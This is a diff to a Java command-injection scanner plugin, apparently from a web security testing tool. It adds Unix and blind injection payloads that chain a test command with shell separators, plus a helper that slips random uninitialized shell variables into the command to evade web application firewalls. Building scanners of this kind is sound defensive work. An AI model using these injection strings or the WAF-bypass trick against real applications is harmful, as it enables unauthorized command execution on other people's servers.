@@ -28,6 +28,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.concurrent.ThreadLocalRandom;
 
 import org.apache.commons.configuration.ConversionException;
 import org.apache.log4j.Logger;
@@ -113,6 +114,24 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
         WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
         PS_PAYLOADS.put(";" + PS_TEST_CMD + " #", PS_CTRL_PATTERN); //chain & comment
         
+	//uninitialized variable waf bypass
+        String insertedCMD = insertUninitVar(NIX_TEST_CMD);
+        // No quote payloads
+        NIX_OS_PAYLOADS.put("&" + insertedCMD + "&", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put(";" + insertedCMD + ";", NIX_CTRL_PATTERN);
+        // Double quote payloads
+        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + "&\"", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("\";" + insertedCMD + ";\"", NIX_CTRL_PATTERN);
+        // Single quote payloads
+        NIX_OS_PAYLOADS.put("'&" + insertedCMD + "&'", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("';" + insertedCMD + ";'", NIX_CTRL_PATTERN);
+        // Special payloads
+        NIX_OS_PAYLOADS.put("\n" + insertedCMD + "\n", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("`" + insertedCMD + "`", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("||" + insertedCMD, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("&&" + insertedCMD, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("|" + insertedCMD + "#", NIX_CTRL_PATTERN);
+	    
         //Used for *nix
         //OS_PAYLOADS.put("\"|\"ld", null);
         //OS_PAYLOADS.put("'|'ld", null);
@@ -169,6 +188,24 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
         // FoxPro for running os commands
         WIN_BLIND_OS_PAYLOADS.add("run " + WIN_BLIND_TEST_CMD);
         PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD + " #"); //chain & comment
+	    
+	//uninitialized variable waf bypass
+        String insertedCMD = insertUninitVar(NIX_BLIND_TEST_CMD);
+        // No quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("&" + insertedCMD + "&");
+        NIX_BLIND_OS_PAYLOADS.add(";" + insertedCMD + ";");
+        // Double quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("\"&" + insertedCMD + "&\"");
+        NIX_BLIND_OS_PAYLOADS.add("\";" + insertedCMD + ";\"");
+        // Single quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("'&" + insertedCMD + "&'");
+        NIX_BLIND_OS_PAYLOADS.add("';" + insertedCMD + ";'");
+        // Special payloads
+        NIX_BLIND_OS_PAYLOADS.add("\n" + insertedCMD + "\n");
+        NIX_BLIND_OS_PAYLOADS.add("`" + insertedCMD + "`");
+        NIX_BLIND_OS_PAYLOADS.add("||" + insertedCMD);
+        NIX_BLIND_OS_PAYLOADS.add("&&" + insertedCMD);
+        NIX_BLIND_OS_PAYLOADS.add("|" + insertedCMD + "#");
     };
                 
     // Logger instance
@@ -623,5 +660,34 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
 
         return result / responseTimes.size();
     }
+	
+    /*Generate payload variants for uninitialized variable waf bypass
+     *https://www.secjuice.com/web-application-firewall-waf-evasion/
+     *
+     * @param cmd the cmd to insert uninitialized variable
+     */
+    private static String insertUninitVar(String cmd){
+        //get a random 1-10 lowercase letters long variable name
+        int randLength = ThreadLocalRandom.current().nextInt(1,11);
+        byte[] array = new byte[randLength+1];
+        //$xxxxxx
+        array[0]='$';
+        for(int i=1;i<randLength+1;++i){
+            array[i]=(byte)ThreadLocalRandom.current().nextInt(97,123);
+        }
+        String generatedName = new String(array);
+        StringBuffer res = new StringBuffer(cmd);
+
+        //insert variable before each space and '/' in the path
+        for(int i=0;i<res.length();++i){
+            if(res.charAt(i)==' '||res.charAt(i)=='/'){
+                res.insert(i,generatedName);
+                i+=randLength+1;
+            }
+        }
+
+        return res.toString();
+    }
+
 
 }
